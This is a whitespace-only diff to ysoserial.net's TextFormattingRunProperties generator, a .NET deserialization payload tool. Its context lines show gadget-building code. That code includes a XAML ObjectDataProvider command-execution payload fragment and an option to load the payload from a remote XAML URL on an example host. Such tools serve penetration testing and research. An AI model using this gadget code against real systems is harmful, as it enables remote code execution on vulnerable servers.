@@ -24,7 +24,7 @@ namespace ysoserial.Generators
         {
             Type typeTFRP = typeof(TextFormattingRunProperties);
             info.SetType(typeTFRP);
-            info.AddValue("ForegroundBrush", _xaml);            
+            info.AddValue("ForegroundBrush", _xaml);
         }
         public TextFormattingRunPropertiesMarshal(string xaml)
         {
@@ -71,7 +71,7 @@ namespace ysoserial.Generators
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
-            {                
+            {
                 {"xamlurl=", "This is to create a very short payload when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
                 {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
             };
@@ -85,10 +85,10 @@ namespace ysoserial.Generators
             /*
             Boolean hasArgs;
             string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
-            
+
             String cmdPart;
 
-            
+
             if (hasArgs)
             {
                 cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
@@ -111,7 +111,7 @@ namespace ysoserial.Generators
      </ObjectDataProvider.MethodParameters>
     </ObjectDataProvider>
 </ResourceDictionary>";
-            
+
 
             // This is a little bit shorter to use startinfo
             if (hasArgs)
@@ -139,7 +139,7 @@ namespace ysoserial.Generators
 
             if (xaml_url != "")
             {
-                // this is when it comes from GenerateWithInit 
+                // this is when it comes from GenerateWithInit
                 inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
             }
 
@@ -198,7 +198,7 @@ namespace ysoserial.Generators
                 {
                     payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)));
                 }
-                
+
 
                 if (inputArgs.Minify)
                 {
@@ -271,7 +271,7 @@ namespace ysoserial.Generators
             {
                 throw new Exception("Formatter not supported");
             }
-                
+
         }
 
         /* this can be used easily by the plugins as well */
@@ -297,5 +297,5 @@ namespace ysoserial.Generators
             TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
             return payload;
         }
-    } 
+    }
 }
